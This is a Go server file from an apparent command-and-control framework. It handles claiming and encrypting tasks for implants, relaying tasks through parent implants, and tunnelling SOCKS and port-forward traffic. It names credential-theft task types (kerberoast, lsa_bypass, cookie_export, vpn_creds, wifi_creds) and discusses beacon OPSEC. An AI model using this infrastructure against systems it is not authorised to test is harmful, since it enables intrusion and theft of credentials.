package server

import (
	"fmt"
	"log/slog"
	"strconv"
	"strings"
	"time"

	"github.com/r0si/sovereign/internal/db"
	"github.com/r0si/sovereign/pkg/protocol"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

// ── Task fetch / wire encryption / SOCKS ──────────────────────────────────

// beaconDispatchPrealloc is the initial capacity for the slices the beacon
// claim queries scan into. GORM allocates a 20-element slice when the
// destination has zero capacity, and db.Task is wide enough that this showed
// up as ~28 KB per query on the idle hot path; giving the slice a small
// capacity makes GORM reuse it ("if the slice cap is externally initialized,
// the externally initialized slice is directly used") and grow only when rows
// actually exist. Four covers the common 0–2 pending tasks per beacon.
const beaconDispatchPrealloc = 4

func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
	var claimedTasks []db.Task
	limit := BeaconTaskFetchLimit
	if len(limits) > 0 && limits[0] >= 0 && limits[0] < limit {
		limit = limits[0]
	}
	if limit == 0 {
		return nil
	}

	var convergence dispatchConvergence
	if err := s.withBusyRetry("claim", func() error {
		return s.db.Transaction(func(tx *gorm.DB) error {
			var agent db.Implant
			if err := tx.Select(dispatchAgentColumns).Where("id = ?", uuid).First(&agent).Error; err != nil {
				return fmt.Errorf("dispatch agent lookup failed: %w", err)
			}
			result, err := s.convergeAgentDispatch(tx, agent, time.Now(), "system")
			if err != nil {
				return err
			}
			convergence.cancelled = append(convergence.cancelled, result.cancelled...)
			convergence.aborts = append(convergence.aborts, result.aborts...)

			pending := make([]db.Task, 0, beaconDispatchPrealloc)
			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
				Select(beaconTaskDispatchColumns).
				Where("agent_id = ? AND status = ?", uuid, "pending").
				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", protocol.TaskTypeUpload).
				Order("priority DESC, created_at ASC").Limit(limit).Find(&pending).Error; err != nil {
				return err
			}
			ids := make([]uint, 0, len(pending))
			for _, pendingTask := range pending {
				if err := s.authorizeBeaconClaim(tx, agent, pendingTask); err != nil {
					slog.Warn("Beacon task blocked by dispatch policy", "agent_id", uuid, "task_id", pendingTask.ID, "error", err)
					continue
				}
				ids = append(ids, pendingTask.ID)
			}
			if len(ids) > 0 {
				result := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").
					Updates(map[string]interface{}{"status": "running", "claimed_by": uuid, "claimed_at": time.Now()})
				if result.Error != nil {
					return result.Error
				}
				if err := tx.Select(beaconTaskDispatchColumns).
					Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", uuid).
					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
					return err
				}
			}

			// Re-carry is another dispatch: apply the same current policy and
			// never replay creation-only operator locks.
			if remaining := limit - len(claimedTasks); remaining > 0 {
				claimedIDs := make([]uint, 0, len(claimedTasks))
				for _, ct := range claimedTasks {
					claimedIDs = append(claimedIDs, ct.ID)
				}
				q := tx.Select(beaconTaskDispatchColumns).
					Where("agent_id = ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", uuid, "running", uuid)
				if len(claimedIDs) > 0 {
					q = q.Where("id NOT IN ?", claimedIDs)
				}
				unacked := make([]db.Task, 0, beaconDispatchPrealloc)
				if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
					return err
				}
				for _, task := range unacked {
					if err := s.authorizeBeaconClaim(tx, agent, task); err != nil {
						slog.Warn("Beacon re-carry blocked by dispatch policy", "agent_id", uuid, "task_id", task.ID, "error", err)
						continue
					}
					claimedTasks = append(claimedTasks, task)
				}
			}
			return nil
		})
	}); err != nil {
		s.releaseDispatchConvergence(convergence)
		claimedTasks = nil
		slog.Error("Failed to claim pending tasks", "agent_id", uuid, "error", err)
	}
	s.applyDispatchConvergence(convergence)

	if len(claimedTasks) > 0 {
		slog.Info("Beacon fetching pending tasks", "agent_id", uuid, "pending_count", len(claimedTasks))
	} else {
		slog.Debug("Beacon fetching pending tasks", "agent_id", uuid, "pending_count", 0)
	}
	tasks := make([]task, 0, len(claimedTasks))
	for _, t := range claimedTasks {
		if t.CredentialID != nil {
			if err := validateCredentialSnapshot(s.db, t); err != nil {
				s.failCredentialSnapshot(t)
				continue
			}
		}
		command, shell, err := taskWireArgs(t)
		if err != nil {
			slog.Error("Cannot dispatch task with unresolved arguments", "agent_id", uuid, "task_id", t.ID, "error", err)
			continue
		}
		wire := task{
			ID: t.ID, Type: t.Type, Command: command, Shell: shell, Path: t.Path, Data: t.Data,
			Offset: t.Offset, Size: t.Size, PrevMAC: t.PrevMAC, MAC: t.MAC, Key: t.TaskKey,
			TransferID: t.TransferID, Direction: t.Direction, Final: t.Final, ExpectedSHA256: t.ExpectedSHA256,
		}
		encryptTaskPayload(s, uuid, &wire)
		tasks = append(tasks, wire)
	}
	return tasks
}

const beaconTaskDispatchColumns = "id, agent_id, type, command, shell, path, data, \"offset\", size, prev_mac, mac, task_key, credential_id, credential_fingerprint, resolved_command, resolved_shell, transfer_id, direction, final, result_sha256, expected_sha256"

func (s *Server) authorizeBeaconClaim(tx *gorm.DB, agent db.Implant, task db.Task) error {
	command, _, path, data, err := taskDispatchFields(task)
	if err != nil {
		return err
	}
	return s.authorizeTaskDispatchOn(agent, task.Type, command, data, path, tx, false)
}

// sensitiveTaskTypes are task types whose Command/Data fields can carry
// secrets or code and are therefore encrypted at dispatch time (in addition
// to the transport envelope) with the session key, bound to (agent, task).
// The set extends the at-rest encryption set (db.SensitiveTaskTypes) with
// operator-facing types that stay searchable in the database (shell, ps,
// upload, download_url) but must not travel the wire in clear.
var sensitiveTaskTypes = buildSensitiveTaskTypes()

func buildSensitiveTaskTypes() map[string]bool {
	m := make(map[string]bool, len(db.SensitiveTaskTypes)+4)
	for k := range db.SensitiveTaskTypes {
		m[k] = true
	}
	for _, k := range []string{"shell", "ps", "upload", "download_url",
		"kerberoast", "lsa_bypass", "cookie_export", "vpn_creds", "wifi_creds"} {
		m[k] = true
	}
	return m
}

// encryptTaskPayload encrypts sensitive task Command/Data fields with the
// agent's session key, bound to agentID||taskID. Fields that fail to encrypt
// are delivered in clear (the transport envelope still protects them); the
// session exists on this path, so failures indicate a real problem worth
// logging rather than dropping the task.
func encryptTaskPayload(s *Server, agentID string, wire *task) {
	if !sensitiveTaskTypes[wire.Type] || s.sessionManager == nil {
		return
	}
	aad := []byte(agentID + "\x00" + strconv.FormatUint(uint64(wire.ID), 10))
	encrypted := false
	if wire.Command != "" {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Command), aad); err == nil {
			wire.Command = ct
			encrypted = true
		} else {
			slog.Error("Task command encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	if wire.Data != "" {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Data), aad); err == nil {
			wire.Data = ct
			encrypted = true
		} else {
			slog.Error("Task data encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	// Shell is encrypted for any wire-sensitive task that carries a Shell value
	// (token_make password and shell interpreter such as cmd.exe / powershell).
	// The agent decrypts Command and Shell together when Encrypted is set;
	// leaving Shell in clear for shell tasks caused "task payload decryption
	// failed" on the implant side.
	if wire.Shell != "" && (db.SensitiveShellTypes[wire.Type] || wire.Type == "shell") {
		if ct, err := s.sessionManager.EncryptB64WithAAD(agentID, []byte(wire.Shell), aad); err == nil {
			wire.Shell = ct
			encrypted = true
		} else {
			slog.Error("Task shell encryption failed", "agent_id", agentID, "task_id", wire.ID, "error", err)
		}
	}
	wire.Encrypted = encrypted
}

func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
	var childIDs []string
	if err := s.db.Model(&db.Implant{}).Where("parent_id = ?", parentUUID).Limit(500).Pluck("id", &childIDs).Error; err != nil {
		slog.Error("Failed to fetch child agents", "parent", parentUUID, "error", err)
		return nil
	}
	if len(childIDs) == 0 {
		return nil
	}

	var claimedTasks []db.Task
	var convergence dispatchConvergence
	if err := s.withBusyRetry("claim", func() error {
		return s.db.Transaction(func(tx *gorm.DB) error {
			var agents []db.Implant
			if err := tx.Select(dispatchAgentColumns).Where("id IN ?", childIDs).Find(&agents).Error; err != nil {
				return err
			}
			byID := make(map[string]db.Implant, len(agents))
			for _, agent := range agents {
				byID[agent.ID] = agent
				result, err := s.convergeAgentDispatch(tx, agent, time.Now(), "system")
				if err != nil {
					return err
				}
				convergence.cancelled = append(convergence.cancelled, result.cancelled...)
				convergence.aborts = append(convergence.aborts, result.aborts...)
			}
			pending := make([]db.Task, 0, beaconDispatchPrealloc)
			if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).Select(beaconTaskDispatchColumns).
				Where("agent_id IN ? AND status = ?", childIDs, "pending").
				Where("NOT (type = ? AND (mac = '' OR mac IS NULL))", protocol.TaskTypeUpload).
				Order("priority DESC, created_at ASC").Limit(BeaconTaskFetchLimit).Find(&pending).Error; err != nil {
				return err
			}
			ids := make([]uint, 0, len(pending))
			for _, task := range pending {
				agent, ok := byID[task.AgentID]
				if !ok {
					return fmt.Errorf("dispatch agent lookup failed for %s", task.AgentID)
				}
				if err := s.authorizeBeaconClaim(tx, agent, task); err != nil {
					slog.Warn("Relayed task blocked by dispatch policy", "agent_id", task.AgentID, "task_id", task.ID, "error", err)
					continue
				}
				ids = append(ids, task.ID)
			}
			if len(ids) > 0 {
				if err := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").
					Updates(map[string]interface{}{"status": "running", "claimed_by": parentUUID, "claimed_at": time.Now()}).Error; err != nil {
					return err
				}
				if err := tx.Select(beaconTaskDispatchColumns).
					Where("id IN ? AND status = ? AND claimed_by = ?", ids, "running", parentUUID).
					Order("priority DESC, created_at ASC").Limit(len(ids)).Find(&claimedTasks).Error; err != nil {
					return err
				}
			}
			if remaining := BeaconTaskFetchLimit - len(claimedTasks); remaining > 0 {
				claimedIDs := make([]uint, 0, len(claimedTasks))
				for _, task := range claimedTasks {
					claimedIDs = append(claimedIDs, task.ID)
				}
				q := tx.Select(beaconTaskDispatchColumns).
					Where("agent_id IN ? AND status = ? AND claimed_by = ? AND acknowledged_at IS NULL", childIDs, "running", parentUUID)
				if len(claimedIDs) > 0 {
					q = q.Where("id NOT IN ?", claimedIDs)
				}
				unacked := make([]db.Task, 0, beaconDispatchPrealloc)
				if err := q.Order("claimed_at ASC").Limit(remaining).Find(&unacked).Error; err != nil {
					return err
				}
				for _, task := range unacked {
					agent, ok := byID[task.AgentID]
					if !ok {
						return fmt.Errorf("dispatch agent lookup failed for %s", task.AgentID)
					}
					if err := s.authorizeBeaconClaim(tx, agent, task); err != nil {
						slog.Warn("Relayed re-carry blocked by dispatch policy", "agent_id", task.AgentID, "task_id", task.ID, "error", err)
						continue
					}
					claimedTasks = append(claimedTasks, task)
				}
			}
			return nil
		})
	}); err != nil {
		s.releaseDispatchConvergence(convergence)
		slog.Error("Failed to batch claim child tasks", "parent", parentUUID, "error", err)
		return nil
	}
	s.applyDispatchConvergence(convergence)

	tasksByAgent := make(map[string][]db.Task, len(childIDs))
	for _, task := range claimedTasks {
		tasksByAgent[strings.ToLower(task.AgentID)] = append(tasksByAgent[strings.ToLower(task.AgentID)], task)
	}
	var relayed []relayedTask
	for _, childID := range childIDs {
		tasks := tasksByAgent[strings.ToLower(childID)]
		if len(tasks) == 0 {
			continue
		}
		rt := relayedTask{AgentID: childID}
		for _, t := range tasks {
			if t.CredentialID != nil {
				if err := validateCredentialSnapshot(s.db, t); err != nil {
					s.failCredentialSnapshot(t)
					continue
				}
			}
			command, shell, err := taskWireArgs(t)
			if err != nil {
				slog.Error("Cannot dispatch relayed task with unresolved arguments", "agent_id", childID, "task_id", t.ID, "error", err)
				continue
			}
			wire := task{
				ID: t.ID, Type: t.Type, Command: command, Shell: shell, Path: t.Path, Data: t.Data,
				Offset: t.Offset, Size: t.Size, PrevMAC: t.PrevMAC, MAC: t.MAC, Key: t.TaskKey,
				TransferID: t.TransferID, Direction: t.Direction, Final: t.Final, ExpectedSHA256: t.ExpectedSHA256,
			}
			if s.sessionManager != nil && s.sessionManager.HasSession(childID) {
				encryptTaskPayload(s, childID, &wire)
			}
			rt.Tasks = append(rt.Tasks, wire)
		}
		relayed = append(relayed, rt)
	}
	return relayed
}

func (s *Server) processSOCKSRelay(uuid string, socksData []socksFrame, resp *beaconResponse) {
	s.processSOCKSRelayWithBudget(uuid, socksData, resp, 0, 0)
}

// processSOCKSRelayWithBudget is processSOCKSRelay with a tunnel frame
// budget for datagram transports (frameSize/budget<=0 drains everything).
func (s *Server) processSOCKSRelayWithBudget(uuid string, socksData []socksFrame, resp *beaconResponse, frameSize, budget int) {
	// Process relay data coming FROM the agent (includes rportfwd frames)
	if len(socksData) > 0 {
		s.processAgentSocksData(uuid, socksData)
		// Handle rportfwd response frames from agent
		for _, f := range socksData {
			if strings.HasPrefix(f.Action, "rportfwd_") {
				s.processRPortFwdData(uuid, f)
			}
			if strings.HasPrefix(f.Action, "lportfwd_") {
				s.processLPortFwdData(uuid, f)
			}
		}
	}
	// Collect pending relay frames going TO the agent
	if frames := s.collectSocksFrames(uuid, frameSize, budget); len(frames) > 0 {
		resp.SocksFrames = frames
	}
	// Fast-poll hint only while traffic flows in either direction: an idle
	// but open session used to pin the agent at 500ms beacons indefinitely
	// (OPSEC burn with zero benefit). Frames in this response re-arm fast
	// mode agent-side on their own; inbound frames mean the operator leg is
	// live. A newly opened operator connection waits for the next normal
	// beacon — use beacon_now for interactive setup.
	if len(resp.SocksFrames) > 0 || len(socksData) > 0 {
		resp.SocksFastMode = true
	}
}
